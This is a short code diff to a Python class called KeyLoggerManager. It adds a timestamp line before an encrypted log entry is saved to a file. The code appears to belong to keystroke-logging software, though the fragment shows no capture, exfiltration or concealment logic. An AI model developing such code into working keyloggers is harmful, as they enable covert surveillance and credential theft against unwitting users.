@@ -46,6 +46,7 @@ class KeyLoggerManager:
                 "Data":str(encrypted_data)
             }
             print(log_entry)
+            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
             self.file_writer.save_manager(log_entry,timestamp)
         self._schedule_next_write()
 
